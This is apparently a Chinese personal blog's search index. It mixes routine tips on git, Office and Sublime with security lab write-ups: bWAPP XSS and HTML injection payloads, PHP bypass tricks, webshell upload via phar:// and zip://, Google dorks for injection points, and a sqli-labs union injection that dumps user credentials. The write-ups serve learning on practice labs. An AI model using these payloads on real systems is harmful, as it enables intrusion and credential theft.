<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Sublime]]></title>
    <url>%2F2018%2F09%2F14%2FSublime-0%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2018%2F09%2F05%2FBwapp-Injection%2F</url>
    <content type="text"><![CDATA[Injection1.HTML Injection - Reflected (GET)1.1 low源码未进行任何过滤1234function no_check($data)&#123; return $data;&#125; 便可想到插入xss语句以及其他类型语句查看源码发现输入的语句以及嵌入到源码中 1.2 medium按照上面的方法进行语句插入，发现直接显示源码，查看源码发现进行了html标签过滤1234$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);$input = urldecode($input);return $input; 既然对输入的数据进行了编码，那就需要绕过了，对其进行一次url编码不可以，那就对输入的数据进行二次url编码，成功了测试url：1http://192.168.112.129/bWAPP/htmli_get.php?firstname=%253Cscript%253Ealert%2528%2527xss%2527%2529%253B%253C%252fscript%253E&amp;lastname=%253Ca%2520href%253D%2522http%253A%252f%252fwww.baidu.com%2522%253Eclick%253C%252fa%253E&amp;form=submit 查看源码，已经成功写入 1.3 high这个使用了==htmlentities()==将所有适用的字符转换为HTML实体，故安全性比较略高讲解绕过htmlentities至此，可以发现html注入反射型漏洞也是有很大危害的，可以进行xss攻击、页面篡改等攻击 2.HTML Injection - Reflected (POST)post的和get型方式一样，不做过多介绍 3.HTML Injection - Reflected (URL)3.1 lowBP抓包，修改host为1.1.1.1 3.2 mediumdocument.write(),动态向页面写入内容document.URL 返回当前页面或文档的URL1$url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; 3.3 high123456789101112131415161718 case &quot;2&quot; : $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); break;function xss_check_3($data, $encoding = &quot;UTF-8&quot;)&#123; // htmlspecialchars - converts special characters to HTML entities // &apos;&amp;&apos; (ampersand) becomes &apos;&amp;amp;&apos; // &apos;&quot;&apos; (double quote) becomes &apos;&amp;quot;&apos; when ENT_NOQUOTES is not set // &quot;&apos;&quot; (single quote) becomes &apos;&amp;#039;&apos; (or &amp;apos;) only when ENT_QUOTES is set // &apos;&lt;&apos; (less than) becomes &apos;&amp;lt;&apos; // &apos;&gt;&apos; (greater than) becomes &apos;&amp;gt;&apos; return htmlspecialchars($data, ENT_QUOTES, $encoding); &#125; 4.]]></content>
  </entry>
  <entry>
    <title><![CDATA[github部署本地仓库到远程仓库]]></title>
    <url>%2F2018%2F08%2F16%2Fgithub%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%2F</url>
    <content type="text"><![CDATA[1.github里面建立仓库1、首先在github里面新建一个仓库 2、创建test仓库 3、创建成功后如图显示 2.windows本地仓库配置1、建立个人仓库文件夹可以使用github的命令：mkdir file 或者直接 右键新建文件夹即可 2、本地仓库初始化（对该文件夹进行初始化）在刚刚新建的文件夹中，右键选择 Git Bash Here打开，或者通过其他方式打开，但需要用cd进入此文件夹目录 1git init 3、创建一个test.md文件1touch test.md 4、添加刚刚创建的test.md文件到本地仓库1git add test.md //git add . 可将本文件夹内文件全部同步到远程github上面 5、提交添加的文件到本地仓库1git commit -m &quot;此处是对文件上传的文件的描述&quot; 6、将本地仓库和远程仓库关联起来1git remote add origin git@github.com:用户名/仓库名 //第一次配置的时候使用即可，以后同步文件不用 7、上传文件到远程仓库12git push -u origin master //第一次上传使用-u参数，以后就不用-u参数了git push origin master //以后直接用此命令便可将本地仓库的文件更新同步到远程仓库 报出错误，原因是本地仓库没有readme.md文件，使用此命令即可解决 1git pull --rebase origin master //pull=fetch+merge 到目前为止已经完成了上传 以后再上传文件直接使用这三个命令即可 123git add . //文件夹内所有文件均上传，可以指定文件来上传git commit -m &quot;对此次上传文件的描述&quot;git push origin master PS：以上操作基于windows以及按照git并配置好了远程链接github的账户 3.本地获取远程仓库文件1、首先要保证本地仓库没有修改过的文件，可以使用git add . 将之前的文件添加到暂存区 2、然后使用如下命令进行拉取远程文件 1git pull origin master 这样显示就是本地已经同步远程最新的文件了 当我们对远程仓库文件做了修改之后，再拉取文件就是如下显示，这样本地仓库已经同步了远程仓库的文件 PS:当直接同步本地文件到远程失败时，可能的原因是直接在远程仓库对文件进行了修改，导致两边数据不一致，此时可以这样执行 12345678先将远程仓库文件同步到本地git add . //git pull origin master同步远程的完成之后，再将本地修改的文件同步到远程仓库git add . git commit -m &quot;对上传文件的描述&quot;git push origin master]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Office任意页面设置页码为起始页码]]></title>
    <url>%2F2018%2F08%2F08%2FOffice-Set-Page%2F</url>
    <content type="text"><![CDATA[要将第N页的页码设置为第一页，需进行一下设置 1、进入页码格式，将起始页码设置为1， 2、将鼠标移动至第N-1页的文段末尾，点击office工具栏上面的布局里面的分隔符，点击下一页（此处以设置第四页的页码为首页为例） 3、编辑第四页的页脚，将 链接到前一条页眉 去掉，此处为去掉后的界面 4、此时可以在第四页的页脚处添加页码，直接在此处显示页码为1，文档的前三页是没有页码的，如果文档前三页有页码，手动将其删除即可]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bwapp-Writeup]]></title>
    <url>%2F2018%2F08%2F05%2FBwapp%2F</url>
    <content type="text"><![CDATA[Injection1.HTML Injection - Reflected (GET)1.1 low源码未进行任何过滤 1234function no_check($data)&#123; return $data;&#125; 便可想到插入xss语句以及其他类型语句查看源码发现输入的语句以及嵌入到源码中 1.2 medium按照上面的方法进行语句插入，发现直接显示源码，查看源码发现进行了html标签过滤 1234$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);$input = urldecode($input);return $input; 既然对输入的数据进行了编码，那就需要绕过了，对其进行一次url编码不可以，那就对输入的数据进行二次url编码，成功了测试url： 1http://192.168.112.129/bWAPP/htmli_get.php?firstname=%253Cscript%253Ealert%2528%2527xss%2527%2529%253B%253C%252fscript%253E&amp;lastname=%253Ca%2520href%253D%2522http%253A%252f%252fwww.baidu.com%2522%253Eclick%253C%252fa%253E&amp;form=submit 查看源码，已经成功写入 1.3 high这个使用了==htmlentities()==将所有适用的字符转换为HTML实体，故安全性比较略高讲解绕过htmlentities至此，可以发现html注入反射型漏洞也是有很大危害的，可以进行xss攻击、页面篡改等攻击 2.HTML Injection - Reflected (POST)post的和get型方式一样，不做过多介绍 3.HTML Injection - Reflected (URL)3.1 lowBP抓包，修改host为1.1.1.1 3.2 mediumdocument.write(),动态向页面写入内容document.URL 返回当前页面或文档的URL 1$url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; 3.3 high123456789101112131415161718 case &quot;2&quot; : $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); break;function xss_check_3($data, $encoding = &quot;UTF-8&quot;)&#123; // htmlspecialchars - converts special characters to HTML entities // &apos;&amp;&apos; (ampersand) becomes &apos;&amp;amp;&apos; // &apos;&quot;&apos; (double quote) becomes &apos;&amp;quot;&apos; when ENT_NOQUOTES is not set // &quot;&apos;&quot; (single quote) becomes &apos;&amp;#039;&apos; (or &amp;apos;) only when ENT_QUOTES is set // &apos;&lt;&apos; (less than) becomes &apos;&amp;lt;&apos; // &apos;&gt;&apos; (greater than) becomes &apos;&amp;gt;&apos; return htmlspecialchars($data, ENT_QUOTES, $encoding); &#125; 4.]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集之命令行的使用]]></title>
    <url>%2F2018%2F08%2F01%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[nslookupnslookup命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。nslookup baidu.com 只要在查询的时候，加上-d参数，即可查询域名的缓存。nslookup -qt=type domain [dns-server]12345678910111213141516171819202122type可以是以下这些类型：A 地址记录AAAA 地址记录AFSDB Andrew文件系统数据库服务器记录ATMA ATM地址记录CNAME 别名记录HINFO 硬件配置记录，包括CPU、操作系统信息ISDN 域名对应的ISDN号码MB 存放指定邮箱的服务器MG 邮件组记录MINFO 邮件组和邮箱的信息记录MR 改名的邮箱记录MX 邮件服务器记录NS 名字服务器记录PTR 反向记录RP 负责人记录RT 路由穿透记录SRV TCP服务器信息记录TXT 域名对应的文本信息X25 域名对应的X.25地址记录例：nslookup -qt=mx baidu.com 8.8.8.8 whoamiLinux下123whoami；显示的是当前用户下的用户名who am i：显示的是登录时的用户名who：显示当前真正登录系统中的用户（不会显示那些用su命令切换用户的登录者） whois用来查找并显示指定用户账号、域名相关信息，包括域名注册时间、拥有者、邮箱等123456789101112131415161718192021可选参数-a 搜寻所有数据库-c 找到最小的包含一个 mnt-irt 属性的匹配-d 同时返回 DNS 反向查询的代理对象(需支持RPSL协议)-F 快速输出原始数据-H 隐藏法律声明内容-i ATTR 进行一次反向查询-l 将精确度降低一级的查询 (需支持RPSL协议)-L 找到所有低精确度匹配-m 找到第一级较高精确度匹配-M 找到所有较高精确度匹配-r 查询联系信息时关闭递归查询-R 显示本地域名对象副本-x 精确匹配-h[主机] 连接到指定 HOST 服务器-p[端口] 连接到指定 PORT 端口-t[类型] 查询指定类型对象头信息-T[类型] 查找指定类型的对象-v[类型] 查询指定类型对象冗余信息-q [版本|类型] 查询特定的服务器信息(需支持RPSL协议)更多参数可以使用man whois 查询 net使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。或者进行用户管理和登陆管理等。 net use连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息1234567NET USE:[domainname\]username] [/USER:[dotted domain name\]username] [/USER:[username@dotted domain name] [/SMARTCARD] [/SAVECRED] [/REQUIREINTEGRITY] net user添加或更改用户账号或显示用户账号信息此命令的语法是:1234567891011121314 net user /?NET USER[username [password | *] [options]] [/DOMAIN] username &#123;password | *&#125; /ADD [options] [/DOMAIN] username [/DELETE] [/DOMAIN] username [/TIMES:&#123;times | ALL&#125;] username [/ACTIVE: &#123;YES | NO&#125;] 查看指定用户信息：net user Administrator添加一个用户：net user username password /add /fullname：&quot;全名&quot; 修改指定用户密码：net user username NewPassword禁用指定用户：net user username /active:no启用指定用户：net user username /active:yes net share创建、删除或显示共享资源1234567891011NET SHAREsharename sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]] [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents| Programs | BranchCache | None] sharename [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents | Programs | BranchCache | None] &#123;sharename | devicename | drive:path&#125; /DELETE sharename \\computername /DELETE netstat用于列出系统上所有的网络套接字连接情况，包括tcp，udp参数使用123456789101112131415161718192021222324252627282930313233343536373839NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval] -a 显示所有连接和侦听端口。 -b 显示在创建每个连接或侦听端口时涉及的 可执行程序。在某些情况下，已知可执行程序承载 多个独立的组件，这些情况下， 显示创建连接或侦听端口时 涉及的组件序列。在此情况下，可执行程序的 名称位于底部 [] 中，它调用的组件位于顶部， 直至达到 TCP/IP。注意，此选项 可能很耗时，并且在你没有足够 权限时可能失败。 -e 显示以太网统计信息。此选项可以与 -s 选项 结合使用。 -f 显示外部地址的完全限定 域名(FQDN)。 -n 以数字形式显示地址和端口号。 -o 显示拥有的与每个连接关联的进程 ID。 -p proto 显示 proto 指定的协议的连接；proto 可以是下列任何一个: TCP、UDP、TCPv6 或 UDPv6。如果与 -s 选项一起用来显示每个协议的统计信息，proto 可以是下列任何一个: IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 或 UDPv6。 -q 显示所有连接、侦听端口和绑定的 非侦听 TCP 端口。绑定的非侦听端口 不一定与活动连接相关联。 -r 显示路由表。 -s 显示每个协议的统计信息。默认情况下， 显示 IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6 的统计信息; -p 选项可用于指定默认的子网。 -t 显示当前连接卸载状态。 -x 显示 NetworkDirect 连接、侦听器和共享 终结点。 -y 显示所有连接的 TCP 连接模板。 无法与其他选项结合使用。 interval 重新显示选定的统计信息，各个显示间暂停的 间隔秒数。按 CTRL+C 停止重新显示 统计信息。如果省略，则 netstat 将打印当前的 配置信息一次。 ping用来测试网络连通性1234567891011121314151617参数如下：输入ping /? ，列出ping的相关参数-c 用来指定ping的回应次数-t ：Ping 指定的计算机直到中断。-a ：将地址解析为计算机名。-n count ：发送 count 指定的 ECHO 数据包数。默认值为 4。-l size ：发送包含由 size 指定的数据量的 ECHO 数据包。默认为 32 字节；最大值是65,527。-f ：在数据包中发送&quot;不要分段&quot;标志。数据包就不会被路由上的网关分段。-i ttl :将&quot;生存时间&quot;字段设置为 ttl 指定的值。-v tos :将&quot;服务类型&quot;字段设置为 tos 指定的值。-r count :在&quot;记录路由&quot;字段中记录传出和返回数据包的路由。count 可以指定最少 1 台，最多 9 台计算机。-s count :指定 count 指定的跃点数的时间戳。-j host-list :利用 host-list 指定的计算机列表路由数据包。连续计算机可以被中间网关分隔（路由稀疏源）IP 允许的最大数量为 9。-k host-list :利用 host-list 指定的计算机列表路由数据包。连续计算机不能被中间网关分隔（路由严格源）IP 允许的最大数量为 9。-w timeout :指定超时间隔，单位为毫秒。destination-list :指定要 ping 的远程计算机。 tracert(windows下) || traceroute(unix&amp;linux)用于探测数据包从源到目的经过路由的IP,分析网络拓扑123456789101112用法: tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] [-R] [-S srcaddr] [-4] [-6] target_name选项: -d 不将地址解析成主机名。 -h maximum_hops 搜索目标的最大跃点数。 -j host-list 与主机列表一起的松散源路由(仅适用于 IPv4)。 -w timeout 等待每个回复的超时时间(以毫秒为单位)。 -R 跟踪往返行程路径(仅适用于 IPv6)。 -S srcaddr 要使用的源地址(仅适用于 IPv6)。 -4 强制使用 IPv4。 -6 强制使用 IPv6。 ipconfig1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253用法: ipconfig [/allcompartments] [/? | /all | /renew [adapter] | /release [adapter] | /renew6 [adapter] | /release6 [adapter] | /flushdns | /displaydns | /registerdns | /showclassid adapter | /setclassid adapter [classid] | /showclassid6 adapter | /setclassid6 adapter [classid] ]其中 adapter 连接名称 (允许使用通配符 * 和 ?，参见示例) 选项: /? 显示此帮助消息 /all 显示完整配置信息。 /release 释放指定适配器的 IPv4 地址。 /release6 释放指定适配器的 IPv6 地址。 /renew 更新指定适配器的 IPv4 地址。 /renew6 更新指定适配器的 IPv6 地址。 /flushdns 清除 DNS 解析程序缓存。 /registerdns 刷新所有 DHCP 租用并重新注册 DNS 名称 /displaydns 显示 DNS 解析程序缓存的内容。 /showclassid 显示适配器允许的所有 DHCP 类 ID。 /setclassid 修改 DHCP 类 ID。 /showclassid6 显示适配器允许的所有 IPv6 DHCP 类 ID。 /setclassid6 修改 IPv6 DHCP 类 ID。默认情况下，仅显示绑定到 TCP/IP 的每个适配器的 IP 地址、子网掩码和默认网关。对于 Release 和 Renew，如果未指定适配器名称，则会释放或更新所有绑定到 TCP/IP 的适配器的 IP 地址租用。对于 Setclassid 和 Setclassid6，如果未指定 ClassId，则会删除 ClassId。示例: &gt; ipconfig ... 显示信息 &gt; ipconfig /all ... 显示详细信息 &gt; ipconfig /renew ... 更新所有适配器 &gt; ipconfig /renew EL* ... 更新所有名称以 EL 开头 的连接 &gt; ipconfig /release *Con* ... 释放所有匹配的连接， 例如“有线以太网连接 1”或 “有线以太网连接 2” &gt; ipconfig /allcompartments ... 显示有关所有隔离舱的 信息 &gt; ipconfig /allcompartments /all ... 显示有关所有隔离舱的 详细信息在排查DNS故障时，经常使用该命令 ipconfig /flushdns来清除dns缓存 其他命令123456789101112131415tasklist -- 显示运行的所有进程ver -- 显示系统版本号ipconfig -- 显示当前 TCP/IP 网络配置systeminfo -- 显示关于计算机及其操作系统的详细配置信息netstat -- 显示网络连接、路由表和网络接口信息qprocess -- 显示 RD 会话主机服务器上正在运行的进程的相关信息query -- 显示进程、会话和 RD 会话主机服务器的相关信息type -- 显示文本文件的内容at -- 计划任务reg -- 注册表操作wmic -- 提供了从命令行接口和批命令脚本执行系统管理的支持wusa -- 安装补丁netsh advfirewall -- 管理防火墙sc -- 用来和NT服务控制器和服务进行通讯的命令行程序rundll32 -- 调用动态链接程序库 net命令详解参考]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP函数漏洞集]]></title>
    <url>%2F2018%2F06%2F08%2FPHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E9%9B%86%2F</url>
    <content type="text"><![CDATA[正则表达式preg_match如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题123456$ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) &#123; die(&apos;error&apos;);&#125; else &#123; // echo(&apos;key...&apos;)&#125; ereg %00 截断ereg 读到 %00 的时候，就截止了12345&lt;?php if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&apos;a&apos;]) === FALSE) &#123; echo &apos;You password must be alphabet&apos;; &#125;?&gt; a=abcd%001234，可以绕过ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE字符串对比解析在这里如果 $_GET[‘password’]为数组，则返回值为NULL如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true其余为false 字符串比较12345678910111213141516171819202122232425&lt;?php echo 0 == &apos;a&apos; ;// a 转换为数字为 0 重点注意 // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc // 十六进制与整数，被转换为同一进制比较 &apos;0xccccccccc&apos; == &apos;54975581388&apos; ; // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0 1 == &apos;1&apos;; 1 == &apos;01&apos;; 10 == &apos;1e1&apos;; &apos;100&apos; == &apos;1e2&apos; ; // 十六进制数与带空格十六进制数，被转换为十六进制整数 &apos;0xABCdef&apos; == &apos; 0xABCdef&apos;; echo &apos;0010e2&apos; == &apos;1e3&apos;; // 0e 开头会被当成数字，又是等于 0*10^xxx=0 // 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过 &apos;0e509367213418206700842008763514&apos; == &apos;0e481036490867661113260034900752&apos;; &apos;0e481036490867661113260034900752&apos; == &apos;0&apos; ; var_dump(md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;)); var_dump(md5(&apos;aabg7XSs&apos;) == md5(&apos;aabC9RqS&apos;)); var_dump(sha1(&apos;aaroZmOk&apos;) == sha1(&apos;aaK1STfY&apos;)); var_dump(sha1(&apos;aaO8zKZF&apos;) == sha1(&apos;aa3OFF9m&apos;));?&gt; 文件包含123http://127.0.0.1/index.php?page=upload这种 url 很容易就能想到可能是文件包含或者伪协议读取http://127.0.0.1/index.php?page=php://filter/read=convert.base64-encode/resource=upload 伪协议php://filter读取文件12index.php?file=php://filter/convert.base64-encode/resource=flag.phpindex.php?file=php://filter/read=convert.base64-encode/resource=flag.php php://input写入文件， 数据利用 POST 传过去1index.php?file=php://input data://将 include 的文件流重定向到用户控制的输入流test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==可以用于控制 file_get_contents 的内容为用户输入的流123$file=$_GET[&apos;file&apos;];$data = @file_get_contents($a,&apos;r&apos;);echo $data; phar://发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含这里的路径为上传的 jpg 文件在服务器的路径/index.php?id=phar://路径/xxx.jpg/shell zip://上述 phar:// 的方法也可以使用 zip://然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。1.zip文件内仅有1.php这个文件123/php?file=zip://1.png%231.php // 也可以尝试不改名为png，直接使用zip上传测试一下/php?file=zip://1.zip%231.php MD5 compare漏洞PHP在处理哈希字符串时，如果利用”!=”或”==”来对哈希值进行比较，它把每一个以”0x”开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么php将会认为他们相同。常见的payload有1234567891011120x01 md5(str) QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a0x02 sha1(str) sha1(&apos;aaroZmOk&apos;) sha1(&apos;aaK1STfY&apos;) sha1(&apos;aaO8zKZF&apos;) sha1(&apos;aa3OFF9m&apos;) 同时MD5不能处理数组，若有以下判断则可用数组绕过12345if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;]))&#123; echo &quot;yes&quot;;&#125;//http://127.0.0.1/1.php?a[]=1&amp;b[]=2 变量覆盖]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google Hack]]></title>
    <url>%2F2018%2F05%2F13%2FGoogleHack%2F</url>
    <content type="text"><![CDATA[关键字 说明 site 指定域名 intitle 标题中存在关键字的网页 intext 标题中存在关键字的网页 info 一些基本信息 inur URL存在关键字的网页 filetype 搜索指定文件类型 案例一：搜索存在敏感信息的网站输入：intitle:管理登录 filetype:php,这句话的意思为查询网页标题含有“管理登录”，并且为php类型的网站，Google可以轻松搜索到很多该类网站案例二：搜集Discuz论坛主机语法为：intext:Powered by Discuz案例三:搜索有注入点的网站语法:inurl:?id=]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sublime text不能安装插件，错误提示]]></title>
    <url>%2F2018%2F05%2F06%2Fsublime%2F</url>
    <content type="text"><![CDATA[sublime text不能安装插件，错误提示There are no packages available for installation。方法一：1、cmd下输入ping sublime.wbond.net记录返回的IP地址2、将上一步得到的IP地址加入到本机hosts文件中，hosts文件所在目录为C:\Windows\System32\drivers\etc123#sublime第一步的IP地址 sublime.wbond.net.#end 4、修改后保存，重启sublime 方法二：一、先安装Package Control.sublime-package到Sublime Text\Packages下面下载链接 密码：viuc二、安装REPL1、手动下载sublimeREPL插件https://github.com/wuub/SublimeREPL，将其解压到sublime Text\Data\Packages目录下2、打开\sublime Text\Data\Packages\sublimeREPL\config\python\Main.sublime-menu文件，找到”id”为”reply_python”的段落，将”cmd”的属性改为[&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;, &quot;$file_basename&quot;]这样相当于将SublimeREPL的python交互环境的命令改为运行当前文件的交互环境，如果还想保留以前的功能，可以自己添加一个这样的节点，注意id值要取名为唯一的id值。3、设置快捷键点击首选项-&gt;按键绑定-用户，然后在弹出的文件中输入 1234567891011121314[ &#123; &quot;keys&quot;: [&quot;alt+q&quot;], &quot;command&quot;: &quot;repl_open&quot;, &quot;caption&quot;: &quot;Python&quot;, &quot;mnemonic&quot;: &quot;p&quot;, &quot;args&quot;: &#123; &quot;type&quot;: &quot;subprocess&quot;, &quot;encoding&quot;: &quot;utf8&quot;, &quot;cmd&quot;: [&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;, &quot;$file&quot;], &quot;cwd&quot;: &quot;$file_path&quot;, &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;, &quot;external_id&quot;: &quot;python&quot; &#125; &#125; ] 本文仅定义了Python - RUN current file的快捷键，这里使用的是alt+q，可以根据自己的需要进行灵活的调整。为了调试方便，我们可以把这个窗口放到右边，先设置sublime的窗口显示为多层，点击查看-&gt;布局-&gt;列数 2列方法二参考https://blog.csdn.net/zhihaoma/article/details/51132755其他方法参考 Sublime默认主题配置 Sublime 透明度设置Sublime安装包下面有Data目录的，直接将设置透明度的Package放入Data目录下面的Package下面即可 没有Data目录的，需要将设置透明度的Package放在sublime的Package目录下，点击 Sublime Text3 的 Preferences -&gt; Browse Packages 打开 Packages 存放目录，将文件放入，并重命名为SublimeTextTrans，然后在Preferences -&gt; Package Setting -&gt; SublimeTextTrans -&gt; Setting - User 就可以设置透明度的级别了。 也可以通过 Ctrl+Shift+1、2、3、4、5、6 加载默认的 6 个透明级别。默认的透明级别在 Preferences -&gt; Package Setting -&gt; SublimeTextTrans -&gt; Setting - Default 中可以查]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10开机键盘无法使用问题]]></title>
    <url>%2F2018%2F05%2F05%2F%E9%94%AE%E7%9B%98%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[电脑开机外置键盘无法使用进入设备管理器发现键盘下的PC/AT 增强型PS/2键盘驱动为感叹号打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}删除UpperFilters项在设备管理器下的键盘选项里删除PC/AT 增强型PS/2键盘卸载此设备，重新启动。此时安装驱动会提示错误代码10，该设备无法启动。 接着修改注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}添加字符串UpperFilters项，内容为kbdclass卸载设备，重新启动。重新启动后问题得以解决。]]></content>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-lab]]></title>
    <url>%2F2018%2F05%2F01%2Fsqli-lab%2F</url>
    <content type="text"><![CDATA[1、 sqli-labs需要lamp或wamp环境，本机使用wamp环境，使用phpstudy的集成环境2、 Sqli-labs的安装，下载sqli-labs，解压到本地www目录下，打开WWW\sqli-labs\sql-connections文件下的db-creds.inc文件，修改mysql账户和密码和本机mysql数据库账户和密码一致3、 浏览器输入http://127.0.0.1/sqli-labs，单击Setup/reset Database for labs此时sqli-labs平台已经搭建好了选择第一关，让输入一个参数进入，那就先传入?id=1吧1、先判断是字符型还是整数型http://127.0.0.1/sqli-labs/Less-1/?id=1http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;进一步判断，http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and ‘1’=’1 ，页面正常http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and ‘1’=’2确定是字符型注入2、判断查询列数http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 4–+报错，未知的4列，那就试一下3http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 3–+现在知道是有三列了3、判断显示位http://127.0.0.1/sqli-labs/Less-1/?id=-1‘ union select 1,2,3–+查询所使用的数据库，以及数据库版本，大于5.0版本的数据库存在information_schema库,http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),version()–+4、 获取所有数据库名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),2–+ 5、 获取数据库所有表名Sqli-labs使用的数据库是security查询数据库中所有表：http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),2–+ 6、 获取表中所有字段Users表中存放用户信息，来查看一下http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),2–+发现有三个字段，7、 获取字段中的数据http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select concat_ws(char(32,58),id,username,password) from users limit 1,1),2–+一次获取一个账户信息，通过limit 0,1 第一个参数控制第n-1个id，第二个参数控制显示行数]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux&Windows之命令行使用]]></title>
    <url>%2F2018%2F04%2F26%2FLinux-Windows%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%2F</url>
